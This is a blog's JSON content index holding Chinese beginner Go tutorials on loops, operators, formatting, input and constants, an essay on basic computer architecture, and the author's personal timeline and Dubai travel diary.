fmt.Println(b&lt;&lt;3)//-72&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang类型转换及移位运算","slug":"Golang类型转换及移位运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang类型转换及移位运算/"}]},{"title":"Golang循环结构","slug":"201911190001","date":"2019-11-17T16:03:00.000Z","updated":"2019-11-18T19:33:59.906Z","comments":true,"path":"2019/11/18/201911190001/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911190001/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175package mainimport ( \"fmt\" \"math/rand\" \"time\")/*无限循环，死循环输出我爱拉芳，一直到死*/func main051() &#123; for &#123; fmt.Println(\"我爱拉芳\") time.Sleep(1 * time.Second) &#125;&#125;/*有限循环输出我爱拉芳，100遍for 起始条件;循环条件;增长条件&#123; 循环体&#125;*/func main052() &#123; /* var i int for i = 1; i &lt;= 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125;*/ for i := 0; i &lt; 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125; fmt.Println(\"终于可以爱别人了！\")&#125;/*倒序循环*/func main053() &#123; for i := 10; i &gt;= 1; i-- &#123; fmt.Println(i) time.Sleep(500 * time.Millisecond) &#125; fmt.Println(\"发射！\")&#125;/*打印 2 4 6 8 10... 100*/func main054() &#123; for i := 2; i &lt; 101; i += 2 &#123; fmt.Println(i) &#125;&#125;/*打一个10*5的“你妹”矩阵*/func main055() &#123; for j := 0; j &lt; 5; j++ &#123; //在同一行打印十个你妹 for i := 0; i &lt; 10; i++ &#123; fmt.Print(\"你妹\\t\\t\") &#125; fmt.Print(\"\\n\") &#125;&#125;/*打印九九乘法表*/func main056() &#123; for i := 1; i &lt;= 9; i++ &#123; for j := 1; j &lt;= i; j++ &#123; fmt.Print(j, \"*\", i, \"=\", j*i, \" \") &#125; fmt.Print(\"\\n\") &#125;&#125;func GetRandom() int &#123; /*获得随机数*/ //当前时间距离1970年0时所逝去的时间纳秒数 seed := time.Now().UnixNano() //使用当前时间纳秒作为随机数种子 myRandom := rand.New(rand.NewSource(seed)) //n := rand.Intn(1000) n := 100 + myRandom.Intn(900) //fmt.Println(n) //将结果随机数返回给调用者 return n&#125;/*·随机生成一个3位数答案·让用户输入其猜想·反馈给用户：猜大了、猜小了、猜对了·如果没猜对，就继续猜·猜对了就退出游戏·如果用户输入“-1”，就直接退出游戏*/func main057() &#123;START: //随机生成一个3位数答案 answer := GetRandom() fmt.Println(answer) var count int = 0 for &#123; /*让用户输入其猜想*/ var guess int fmt.Println(\"骚年请输入你的猜想(100-999),-1=退出，0=重玩，\") fmt.Scan(&amp;guess) /*看看用户是否想退出*/ if guess == -1 &#123; break &#125; else if guess == 0 &#123; goto START &#125; /*反馈给用户：猜大了、猜小了、猜对了*/ count ++ if guess &gt; answer &#123; fmt.Printf(\"猜大了,共用了%d次\\n\", count) &#125; else if guess &lt; answer &#123; fmt.Printf(\"猜小了,共用了%d次\\n\", count) &#125; else &#123; fmt.Printf(\"猜对了,共用了%d次\\n\", count) //跳出循环 break &#125; &#125; fmt.Println(\"GAME OVER\")&#125;/*打印1-49，逢5的整数倍就跳过*/func main058() &#123; var i int = 0 for &#123; i++ if i &gt; 49&#123; //跳出整个循环 break &#125; if i%5 == 0 &#123; //跳过本次循环的剩余部分，直接进入下一次循环 continue &#125; fmt.Print(\"当前是：\") fmt.Println(i) &#125; fmt.Println(\"GAME OVER\")&#125;func main() &#123; fmt.Println(GetRandom())&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang循环结构","slug":"Golang循环结构","permalink":"https://xiaowuyoucy.github.io/tags/Golang循环结构/"}]},{"title":"Golang程序运算","slug":"201911160050","date":"2019-11-15T16:51:18.000Z","updated":"2019-11-17T09:00:06.792Z","comments":true,"path":"2019/11/16/201911160050/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/201911160050/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153package mainimport ( \"fmt\" \"math\")func main() &#123; var a int = 10 /*自加1*/ //a = a + 2 //a += 2 //a++ /*自减1*/ //a = a - 1 //a -= 2 //a-- /*自乘运算*/ //a = a * 2 //a *= 2 //a = a / 2 //a /= 2 /*自求模（余）*/ //a = a % 3 a %= 3 fmt.Println(a)&#125;/*数学运算*/func main051() &#123; /*加减乘除，求余*/ fmt.Println(\"5+3=\", 5+3) //8 fmt.Println(\"5-3=\", 5-3) //2 fmt.Println(\"5*3=\", 5*3) //15 fmt.Println(\"5/3=\", 5/3) //1 fmt.Println(\"5%3=\", 5%3) //2 /*乘方和开方*/ fmt.Println(\"5^3=\", math.Pow(5, 3)) //125 fmt.Println(\"125开三次方=\", math.Pow(125.0, 1.0/3.0)) //5 /* 四舍五入 负数的四舍五入原则：先对绝对值四舍五入，再加负号 */ fmt.Println(\"3.49的四舍五入=\", math.Round(3.49)) //3 fmt.Println(\"3.51的四舍五入=\", math.Round(3.51)) //4 fmt.Println(\"-3.49的四舍五入=\", math.Round(-3.49)) //-3 fmt.Println(\"-3.51的四舍五入=\", math.Round(-3.51)) //-4 /*纯舍与纯入*/ fmt.Println(\"3.49的四舍五入=\", math.Floor(3.99)) //3 fmt.Println(\"3.51的四舍五入=\", math.Ceil(3.01)) //4 /*绝对值*/ fmt.Println(\"-3.14的绝对值\", math.Abs(-3.14)) //3.14 /* 三角函数： 参数必须是弧度而不是角度 */ fmt.Println(\"30°的正弦=\", math.Sin((30.0/180)*math.Pi)) fmt.Println(\"30°的余弦=\", math.Cos((30.0/180)*math.Pi)) fmt.Println(\"30°的正切=\", math.Tan((30.0/180)*math.Pi)) fmt.Println(\"30°的余切=\", 1.0/math.Tan((30.0/180)*math.Pi)) /*反三角函数*/ fmt.Println(\"正弦为0.5的角度是\", math.Asin(0.5)) //0.5235987755982989=30度的弧度表示&#125;/*比较运算比较运算符：&gt;,&lt;,==,!=,&gt;=,&lt;=比较运算的结果是布尔值：true或false*//*逻辑运算逻辑与：两者都为真，结果才为真逻辑或：两者只要有一个为真，结果就为真逻辑非：非真为假，非假为真*/func main052() &#123; a1 := (1+1 == 2) //true a0 := (1+1 != 2) //false b1 := (1+1 &gt;= 2) //true b0 := (1+1 &lt; 2) //false fmt.Println(a1, a0, b1, b0) /*逻辑与*/ fmt.Println(a1 &amp;&amp; b1) //true fmt.Println(a1 &amp;&amp; b0) //false fmt.Println(a0 &amp;&amp; b1) //false fmt.Println(a0 &amp;&amp; b0) //false /*逻辑或*/ fmt.Println(a1 || b1) //true fmt.Println(a1 || b0) //true fmt.Println(a0 || b1) //true fmt.Println(a0 || b0) //false /*逻辑或*/ fmt.Println(!a1) //false fmt.Println(!a0) //true fmt.Println(!b1) //false fmt.Println(!b0) //true&#125;/*位运算&amp; 按位与 两位都为1，结果才为1| 按位或 只要有一位为1，结果就为1^ 按位异或 两位不相同，结果就为1，否则就为0&lt;&lt;&gt;&gt;*/func main053() &#123; //a := 23 //b := 34 var a uint8 = 23 var b uint8 = 34 fmt.Println(a &amp; b) //2 fmt.Println(a | b) //55 fmt.Println(a ^ b) //53 /*移位运算*/ fmt.Println(a &lt;&lt; 2) //92 fmt.Println(a &gt;&gt; 2) //5 /* 左移的溢出 a为无符号8位整型，向左侧溢出后，最高位为数据位 */ fmt.Println(a &lt;&lt; 4) //112 fmt.Println(a &lt;&lt; 5) //1110,0000无符号为224 /* 左移的溢出 a为有符号8位整型，向左侧溢出后，最高位为符号位——要考虑正负数问题 最高位为0，非负数 最高位为1，负数的反码，-1再取反得到绝对值 */ var c int8 = 23 fmt.Println(c &lt;&lt; 5) //1110,0000有符号-32&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang程序运算","slug":"Golang程序运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang程序运算/"}]},{"title":"Golang基础类型占位符","slug":"20191116038","date":"2019-11-15T16:40:18.000Z","updated":"2019-11-15T16:46:18.416Z","comments":true,"path":"2019/11/16/20191116038/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/20191116038/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package mainimport \"fmt\"/*认识基本数据类型*/func main041() &#123; //整型 var a byte = 123 var b rune = 123 var c int = 123 var d uint = 123 fmt.Println(a,b,c,d) //浮点型 var rmb float32 = 1.23 //var atomRadius float64 = 1.234567890 var atomRadius = 1.234567890 fmt.Println(rmb,atomRadius) //字符串型 var name string = \"张三\" fmt.Println(name) //布尔型 var isClever = true var isBrave bool = false fmt.Println(isClever,isBrave) /*查看变量的类型*/ fmt.Printf(\"a的类型是%T\\n\",a) fmt.Printf(\"isClever的类型是%T\\n\",isClever) fmt.Printf(\"atomRadius的类型是%T\\n\",atomRadius) fmt.Printf(\"1.23的类型是%T\\n\",1.23) fmt.Printf(\"你妹的类型是%T\",\"你妹\") fmt.Printf(\"3+4i的类型是%T\",3+4i)&#125;/*基本类型占位符%s 字符串占位符%d 整型占位符（十进制）%f 浮点型占位符,%.2f精确到小数点后两位%t 布尔占位符*/func main() &#123; //使用占位符进行输出 fmt.Printf(\"我是%s,今年%d岁了，比特币余额%.2f，我美吗？——%t\\n\",\"比尔\",18,1.234567890,false) //输出时使用5字符宽度(默认右对齐) fmt.Printf(\"我是%5s,今年%5d岁了，比特币余额%5.2f，我美吗？——%5t\\n\",\"比尔\",18,1.234567890,false) //5位字符宽度，左对齐 fmt.Printf(\"我是%-5s,今年%-5d岁了，比特币余额%-5.2f，我美吗？——%-5t\\n\",\"比尔\",18,1.234567890,false) //打印并换行 fmt.Println(\"陈述完毕！\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础类型占位符","slug":"Golang基础类型占位符","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础类型占位符/"}]},{"title":"Golang标准输入与输出","slug":"201911152305","date":"2019-11-15T15:06:01.000Z","updated":"2019-11-15T15:42:39.487Z","comments":true,"path":"2019/11/15/201911152305/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152305/","excerpt":"","text":"每次接收一个用户输入 1234567891011121314151617181920212223242526272829303132333435package mainimport ( \"fmt\" \"strconv\")func main031() &#123; //定义a,b两个字符串型变量，用于接收用户的输入（用户的任何输入在类型转换前都是字符串） var a, b string //提示用户输入两个数 fmt.Println(\"骚年请输入相加的两个数：\") //将用户输入的第一个“数据”存入a的内存地址（&amp;a代表对变量a取地址） fmt.Scan(&amp;a) //将用户的第二个输入存入b的内存地址 fmt.Scan(&amp;b) fmt.Println(\"a=\", a) //12 fmt.Println(\"b=\", b) //34 // 字符串的相加实际是拼接操作 fmt.Println(\"a+b=\", a+b) //1234 // 先将字符串a,b转化为64位整型，再做相加计算 //aInt，bInt的类型为整型 aInt, _ := strconv.ParseInt(a, 0, 64) bInt, _ := strconv.ParseInt(b, 0, 64) fmt.Println(\"a+b=\", aInt+bInt) //输出结果&#125; 一次性接收多个用户输入 12345678910111213func main() &#123; fmt.Println(\"请输入两个女神的名字\") //定义两个字符串变量 var godess1, godess2 string //一次性接收两个用户输入，分别存入godess1, godess2变量的内存 //多次输入之间用空格分隔 fmt.Scan(&amp;godess1, &amp;godess2) fmt.Println(\"你喜欢\", godess1) fmt.Println(\"你喜欢\", godess2)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang标准输入与输出","slug":"Golang标准输入与输出","permalink":"https://xiaowuyoucy.github.io/tags/Golang标准输入与输出/"}]},{"title":"iota定义常量组","slug":"201911152154","date":"2019-11-15T13:56:00.000Z","updated":"2019-11-15T16:26:26.564Z","comments":true,"path":"2019/11/15/201911152154/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152154/","excerpt":"","text":"iota常量组概述 第一个常量的iota，值为0 后面的常量自动沿用第一个常量的表达式 后面常量中的iota会自动递增 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * @Author: Administrator * @Description: * @File: 2 使用ioat定义常量组 * @Version: 1.13.4 * @Date: 2019/11/15 21:34 */package mainimport \"fmt\"/*使用iota 定义一组常量后边的常量(iota)会以n+1的递增，iota的序号默认是以0开始的*///案例1const ( USA = iota + 1 China Russia Britain France)func main1() &#123; fmt.Println(USA,China,Russia,Britain,France) //输出结果：1 2 3 4 5&#125;//案例2const ( Spring = (iota + 1) * 2 Summer Autumn Winter)func main() &#123; fmt.Println(Spring,Summer,Autumn,Winter) //输出结果：2 4 6 8&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"iota定义常量组","slug":"iota定义常量组","permalink":"https://xiaowuyoucy.github.io/tags/iota定义常量组/"}]},{"title":"Golang","slug":"201911152138","date":"2019-11-15T13:38:18.000Z","updated":"2019-12-04T17:07:39.006Z","comments":true,"path":"2019/11/15/201911152138/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152138/","excerpt":"","text":"Golang基础 1.1 常量、变量、表达式 1.2 iota定义常量组 1.3 标准输入与输出 1.4 基础类型占位符 1.5 程序运算 1.6 类型转换及移位运算 1.7 流程控制 1.8 循环结构 1.9 GOTO语句 2.0 延时执行 defer 2.1 函数 2.2 匿名函数 2.3 闭包函数 2.4 指针","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/tags/Golang/"}]},{"title":"计算机基础","slug":"201910190031","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-17T09:02:41.207Z","comments":true,"path":"2019/11/15/201910190031/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201910190031/","excerpt":"","text":"简谈计算机 人类的起源直到今天都是一个未解之谜或者有争议性的话题。 这个问题引申一下可以诞生几个新的问题： 火星曾经有过生命吗？ 地球的起源。 月球的起源。 宇宙的起源。 我们常常听说，光的速度是每秒30万公里，地球诞生46亿年。 恐龙6500万年被毁灭。 人类是由猿猴演变而来。 水是生命的起源。 很多人把这些从小听到大的科普知识当做真理，公理去视为衡量一切的标准。 但人类随着科学的进步，历史上曾经视为一些公理的知识已经被推翻。 谁能肯定光速在传播的过程中，不会像声音一样因为不同的介质而发生改变。 谁能肯定人类测量历史，年份的技术手段是精确无误或者误差很小。 谁能肯定生命的形成必须倚靠氧气呢？ 我们带着求知的心理去学习，去探索，去研究。 但也要提醒自己，我此时此刻所处的这个时代，我今天所学的知识，不一定就是完全准确的，对未知要有一颗谦卑敬畏之心。 亚里斯多德时代奉为真理的东西很快就被推翻了，现在没掌握的东西没准哪天就被发现掌握了。 有兴趣的朋友，可以通过搜索引擎看一下让人震惊的“电子双缝干涉实验” 。 虽然未必每一个人都要成为“计算机科学家”或者“程序员”。 但当你开始接触这个专业的时候，从某种程度上说：“你也是踏入了科学世界的大门。” 人类经历了石器时代、青铜时代、铁器时代、以及标志着近代的蒸汽时代、电气时代 现在踏入了信息时代，下一个时代也许是生物智能时代…… 在电气时代发现了电流，电子、电磁、电磁波、也有了世界第一台电子计算机。 后来又设计了机器语言、汇编语言、各种各样的编程语言，其中比较经典的是直到今天还有很多人学习使用的C语言、C++。 Unix、Linux、Windows操作系统也在不久之后诞生了第一个版本。 1999年上映了一部电影《异次元骇客》，电影讲述了用计算机虚拟出了洛杉矶，随着科学的发展以及人类对宇宙的观察。 有了一种新的猜测： 我们人类是被创造和设计的，就像程序员编写的游戏一样。 各种各样的自然法则，大气压，水压，重力，光速，声速等都是被提前设定好的。 著名的小说《三体》，电影《超时空接触》《星际穿越》《最远的地方》《黑客帝国》《月球》等艺术作品也拓展了我们想象的边缘。 如果你喜欢看一些网络小说和电影，那《无限恐怖》小说更是让人眼前一亮，脑洞大开。 人类与身居来的好奇心，不断地探索中，有很多我们肉眼无法看到的神秘力量。 这些东西对我们生活中吃喝拉撒似乎没有任何的意义，但只要把眼光抬高一点，仰望星空，一种奇妙难以言喻的心情，那是我们对未知，对真相的渴望。 温家宝总理2007年5月14日公布了一首诗歌《仰望星空》 一个民族有一些关注天空的人，他们才有希望；一个民族只是关心脚下的事情，那是没有未来的。 我们的民族是大有希望的民族！我希望同学们经常地仰望天空，学会做人，学会思考，学会知识和技能，做一个关心世界和国家命运的人。 仰望星空 我仰望星空， 它是那样辽阔而深邃； 那无穷的真理， 让我苦苦地求索追随。 我仰望星空， 它是那样庄严而圣洁； 那凛然的正义， 让我充满热爱、感到敬畏。 我仰望星空， 它是那样自由而宁静； 那博大的胸怀， 让我的心灵栖息依偎。 我仰望星空， 它是那样壮丽而光辉； 那永恒的炽热， 让我心中燃起希望的烈焰、响起春雷。 电脑结构 以上结构图，最初是由 冯·诺伊曼 （计算机科学家）所提出，又称之为”冯·诺伊曼结构“ 图中分别为：输入设备、输出设备、存储器、运算器和控制器；这些都是计算机的主要部件。 我们在玩电脑的时候，我们使用键盘鼠标来操作电脑，我们在和其他人QQ聊天的时候，鼠标可以帮我们选中聊天的人， 打开聊天窗口，键盘则是负责打字，帮我们输入聊天的内容。 我们在操作键盘鼠标的时候，其实都是在告诉电脑来做什么的。我们管键盘和鼠标叫输入设备。 输入设备： 向电脑输入数据和信息的设备。除了键盘。除了键盘鼠标，其他输入设备还包括触摸板、麦克风、摄像头，游戏手柄、扫描仪等等 显示器用来向我们展示画面，显示内容，音箱则播放音乐给我们听，我们管他们叫输出设备。 输出设备： 将电脑中的信息输出给用户的设备。常用的输入设备有：显示器、音箱、打印机、投影仪等等 我们买来电脑，如果只有键盘鼠标、显示器、音箱，我们能玩电脑么？肯定不能。 那么其实电脑机箱才是真正的工作的设备， 输入输出设备只是用来让我们和电脑机箱来做交互的。 那机箱内部都有什么呢？我们看一下下面的图片： 我们来看一下这里的零件都有什么用 主板 连接所有其他设备的设备，是其他设备的载体，主板主要是为CPU、内存、显卡、硬盘等提供平台，相当于人体的躯干，关联着各个器官。 中央处理器（Cntral Pocessing Uit ） CPU：中央处理单元(Cntral Pocessing Uit)的缩写，也叫处理器，是计算机的运算核心和控制核心。人靠大脑思考，电脑靠CPU来运算、控制。让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。也被人们称之为“数据仓库”。 内存 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 显卡 显卡：显示器想要呈现画面，显卡是关键。简单来说，就是负责在显示屏上显示一切信息。打个比方，它就像是人的眼睛，没有了它，电脑就无法驱动形成图像了。 显卡性能好，电脑的图形处理能力就高，尤其在玩游戏时更能发现这个（所以很多游戏会要求显卡性能）对玩家而言，最好选择独立显卡。不过，如果不玩大型游戏，CPU内置核心显卡也基本能满足要求;缺点： 系统功耗有所加大，发热量也较大，额外购买 。 电源 电源：将电压220伏的市电转换为低等电压，然后送到主板及各个硬件！供电！电脑运行需要电力，而电源就是为此供电的，也可以说它在为电脑提供一切动力。电源决定了电脑的稳定性。它和人体心脏功能类似，都是提供动力的核心。 网卡 网卡：提供联网的硬件，一般集成在主板上。 其他… 说了这么多，其实最最重要的设备是什么呢？ CPU、硬盘、内存。 现在我们来说一下CPU、硬盘、内存三者之间的关系。 首先 ,我们先回想一下三者的作用： CPU：是计算机的运算核心和控制核心，让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。 也被人们称之为“数据仓库”。 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 然后， 我们再来看一下程序是如何执行起来的。 当我们在电脑上打开QQ时（右键-打开 或者双击QQ图标），其实是通过鼠标（输入设备）向CPU发送了一条命令，CPU接收到这条命令后， QQ程序就从硬盘里被加载到内存（加载时不通过处理器，直接从硬盘加载程序到内存里），加载完成后，CPU就开始执行QQ程序。 程序执行起来后，CPU可以让QQ程序显示在我们的在显示器上。也就是你看到了QQ 程序运行起来了。如果这个时候，你用QQ截取了一张屏幕的图片， 那么这张图片会首先保存到内存，在没有退出截屏状态时，你可以在这张图片上写字、画线条，等你右键保存这张图片的时候，这张图片就会保存到硬盘里。 通过了解一个程序是如何运行起来的，我们就可以了解三者是如何工作的 。 可能有些人会不明白，如果程序是这样执行起来的话，那么为什么CPU不直接在硬盘里执行程序，而非要把程序放到内存后在执行呢？ 这里是有原因的。我们先来看几张图： 好点的企业用机械硬盘 ： 内存的读写速度： 通过上图我们可以看出，内存存取数据的速度比硬盘的存取速度快了10倍， 在某些环境里，硬盘和内存之间的速度差距可能会更大。 而CPU的速度比内存不知还要快多少倍。当我们把程序从硬盘放到内存以后，CPU就直接在内存运行程序，这样比CPU直接在硬盘运行程序就要快很多。 内存解决了一部分CPU运行过快，而硬盘数据存取太慢的问题。 提高了我们的电脑的运行速度。 内存就如同一条“高速车道”一般，数据由传输速度较慢的硬盘通过这条高速车道传送至CPU进行处理！ 但内存是带电存储的(一旦断电数据就会消失)，而且容量有限，所以要长时间储存程序或数据就需要使用硬盘。 其实内存在这里起了两个作用： \\1. 保存从硬盘读取的数据，提供给CPU使用 \\2. 保存CPU的一些临时执行结果，以便CPU下次使用或保存到硬盘 三者之间的关系： 简单来说，硬盘用来存储我们的程序和数据，当我们运行程序的时候，CPU首先接受到我们的命令，之后CPU是告诉硬盘，我要运行你存储的程序A， 你把程序A送到内存去。CPU对内存说，我让硬盘把程序A送到你这里来了，你保存一下。 等程序A被完整的送到内存之后。CPU就开始执行程序A。 过程就像上面说的，我们在举一个接近我们生活的例子。 如果说把硬盘比喻成一个大仓库，CPU比喻成加工车间，那么内存就是一个临时的小仓库；从距离上来说， 相比内存到CPU的距离和硬盘到内存的距离，内存和CPU的距离更短；硬盘（大仓库）用来保存车间需要用的原料和最终生产出来的商品。仓库太大，取出原料和存储商品太慢，耗时间。 内存（临时小仓库）：原料会先放到这里，小仓库，可以很快的找到需要的原料或商品。 CPU（车间）：从内存（小仓库）里拿到原料，生产商品。中间会有半成品，半成品可以放在内存（小仓库）里。","categories":[{"name":"简谈计算机","slug":"简谈计算机","permalink":"https://xiaowuyoucy.github.io/categories/简谈计算机/"}],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://xiaowuyoucy.github.io/tags/计算机基础/"}]},{"title":"Golang常量与变量表达式","slug":"201911151907","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-15T16:26:29.255Z","comments":true,"path":"2019/11/15/201911151907/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911151907/","excerpt":"","text":"1.常量与表里表达式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * @Author: Administrator * @Description: * @File: 01常量变量表达式 * @Version: 1.13.4 * @Date: 2019/11/15 18:58 */// 包名（main包下的main函数是程序的入口）package main// 导入sdk（software developing kit）中的fmt包import \"fmt\"/*一次性定义多个常量定义在函数以外的常量对所有函数可见*/const ( lightSpeed = 300000 months = 12)/*一次性定义多个变量定义在函数以外的变量对所有函数可见*/var ( //驼峰风格的成员定义 yearSeconds = 365 * 24 * 3600 //首字母大写的成员对其它包可见 //YearSeconds = 365 * 24 * 3600 //小写字母+下划线风格的成员定义 //year_seconds = 365 * 24 * 3600 //一个月有30天 monthDays = 30)// 入口函数（main包下的main函数是程序的入口）func main01() &#123; // 定义圆周率常量 const pi = 3.14 // 定义圆的半径变量 var radius = 10.0 // 定义圆面积变量 var area = 0.0 // 使用表达式求圆的面积，赋值给面积变量 area = pi * radius * radius // 输出结果 fmt.Println(\"圆的面积是\", area)&#125;// 访问全局常量和变量（写在函数外部的成员可以被当前包下的所有函数访问）func main02() &#123; //计算一光年的距离 //var lightYearDistance = lightSpeed * yearSeconds //变量的声明赋值二合一（只能在函数内部） lightYearDistance := lightSpeed * yearSeconds //计算一年大概有多少天 seasonDays := monthDays * months fmt.Println(\"一光年有\",lightYearDistance,\"公里；一个年有\",seasonDays,\"天\")&#125;func main() &#123; // 一次性定义多个常量 const a,b,c = 1,2,3 //一次性定义多个变量 var d,e,f = 4,5,6 //输出 fmt.Println(a,b,c) fmt.Println(d,e,f)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang常量与变量里表达式","slug":"Golang常量与变量里表达式","permalink":"https://xiaowuyoucy.github.io/tags/Golang常量与变量里表达式/"}]},{"title":"人生事件纪要","slug":"201909250204","date":"2019-09-24T18:18:00.000Z","updated":"2019-10-18T11:43:45.679Z","comments":true,"path":"2019/09/25/201909250204/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/09/25/201909250204/","excerpt":"","text":"1996.02.06 出生 2003.09.01 开始小学生涯 2009.07.01 结束小学生涯 2009.09.01 开始初中生涯 2011.07.01 结束初中生涯 2011.05.01 开始高中生涯 2013.05.01 结束高中生涯 2013.09.01 开始大学生涯 2015.7.01 结算大学生涯 2015.08 第一份实习工作 2015.08-2016.02 工作内容：前端开发 2016.03 嘉峪科技有限公司 2016.03-2016.12 工作内容：网络安全 2016.04.北京的记忆 2016.04 第一次去北京;目的：访问朋友，互相交流学习 同年在北京感受了人生中，第一场大雪。 2017.11.第一次开始创业 地点:北京昌平区 2018.06 第一次融资 ；地点:北京 2018.06.加入老男孩教育 加入老男孩旗下的 (深圳市爱编程教育科技有限公司) 深圳分校 任职：项目经理兼讲师 2019.08.迪拜出行 2019.08 第一次去迪拜;目的：相约于迪拜 机场出行前，我看到机场有Exchange货币兑换的服务站，换了些美刀（世界通用货币） 广州白云国际机场----&gt;排队取机票 买了从白云机场到科伦波，中转迪拜的航班机票 途径----&gt;科伦波----&gt;里斯兰卡 这一晚我没有睡，在飞机上打了一晚的斯洛克 早上 7:30分（科伦波时间） 抵达了 里斯兰卡机场，在机场待了一个上午 中午（12:55时）从里斯兰卡机场飞往迪拜 里斯兰卡上空 20:00时（北京时间）抵达迪拜国际机场 办理出境手续 迪拜的地铁 穿上了当地人的衣服（长袍） 是当地的一种文化 与朋友一起购买，当然是他们购物 - -! 我负责拿东西 见识了当今世界上最高的建筑， 哈利法塔（Burj Khalifa Tower ） 哈利法塔的电梯 ，世界上最快的电梯之一 身处于在哈利法塔（Burj Khalifa Tower ）顶层 位于著名的帆船酒店（ Burj Al Arab ）沙滩 回程的时候，我决定去一趟位于迪拜100多公里外的，阿布扎比市 位于阿布扎比法拉利公园 机场的美食广场内有麦当劳、汉堡王、法式饼店及印度远东餐厅等。此外还有星巴克、雪糕店等，在迪拜机场，总能找到你喜欢的口味，迪拜机场有很多中国售货员，在异国他乡听到服务员跟你说国语格外亲切,看桌面上的“亮点” 是我随时带着的充电宝，中国街电，我背包里还有好几个充电宝呢，哈哈。 在离开迪拜之前，在机场内逛了逛，迪拜机场内也非常奢华，所有的挂钟都是劳力士的，尽显奢华 ，这时我没有拍照片，这里名气最大的还是免税店，被誉为世界上第三大机场免税店，24小时营业，迪拜机场每年都举行机场购物中大奖促销活动，任何一个乘客，凡机场购物蛮一定金额，都有机会赢得豪华轿车，当然我能说这是个噱头吗？哪有那么容易，让你抽到豪车走，想想就好了。 逛了一下，也不知道买些什么手信带回去给朋友们，思路想去的也觉得没有什么可买，最后买了几条迪拜的香烟 我们则如同走在机场的传输带上一样,有信心的话我们可以倒着走,让别人先去,我们慢慢的欣赏沿途风景,因为 未来的生活是你今天的决定。 就满脸胡子的那个土著朋友，感叹的说 “此次的离别，不知道何时有机会见面，我说我们合影留念吧“ 我这朋友中文讲得不错好，给大家show一下 他讲中文的视频，哈哈哈~~~~ 我于23:30时（阿联酋迪拜时间）登上了飞机离开这片沙漠，此时是我人生中第一次坐世界上最大的客机A380，但我并不开心，因为我丢掉了行李箱，在起飞之前我尝试和飞机上的空姐以及机长沟通，容许我几分钟时间，让我去拿一下行李箱，他们对我说“NO” 理由是马上要起飞了，行李箱里面有我新买的衣服以及心爱的Nike鞋子，还有一些朋友送的东西，迪拜本地的特产。 只追求有道理 会耽误有效果的人生，难以有成功快乐的体验 用快乐带动心情，用观念导航人生 用执着追求事业 